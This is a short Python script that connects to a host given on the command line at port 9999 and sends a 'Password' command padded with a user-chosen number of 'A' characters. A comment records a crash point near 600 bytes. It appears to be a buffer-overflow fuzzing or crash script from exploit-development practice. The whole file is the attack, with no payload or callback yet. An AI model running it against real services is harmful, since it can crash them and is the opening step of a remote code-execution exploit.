import socket,sys

address = sys.argv[1]
port=9999

#breakpoing 600
value = input("Enter the buffer Value : ")

buffer = 'A'* value

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((address,port))
s.send('Password ' + buffer + '\r\n')
s.close()
